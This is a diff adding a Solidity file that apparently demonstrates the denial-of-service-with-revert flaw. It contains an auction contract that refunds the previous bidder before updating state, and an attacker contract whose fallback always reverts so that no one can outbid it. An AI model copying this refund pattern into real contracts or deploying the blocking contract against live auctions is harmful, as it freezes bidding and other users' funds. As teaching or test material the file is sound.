@@ -1,0 +1,67 @@
+pragma solidity ^0.5.0;
+
+contract DOSwithRevert{
+    
+    // 0.5.0 explicitation
+    address payable highestBidder;
+    uint highestBidAmount;
+    uint public val = 0;
+    
+    function bid()
+    public
+    payable{
+        
+        require(msg.value>highestBidAmount);
+        
+        highestBidder.transfer(highestBidAmount);
+        
+        highestBidder = msg.sender;
+        highestBidAmount = msg.value;
+    }
+    
+    function showHighestBid()
+    public
+    view
+    returns(uint){
+        return highestBidAmount / 1 ether;
+    }
+
+    function showHighestBidder()
+    public
+    view
+    returns(address){
+        return highestBidder;
+    }    
+    
+    function increaseVal() public {
+        val = val+1;
+    }
+}
+contract R1A{
+    
+    DOSwithRevert dwr;
+    
+    function setAddress(address _addr)
+    public{
+        dwr = DOSwithRevert(_addr);
+    }
+    
+    function callBid() 
+    public payable{
+         dwr.bid.value(address(this).balance)();
+    }
+    function inV() public {
+        dwr.increaseVal();
+    }
+    function addBal() public payable{
+        
+    }
+    function getContractBalance() 
+    public
+    view returns(uint){
+        return address(this).balance;
+    }
+    function() payable external{
+        require(msg.value < 0);
+    }
+}
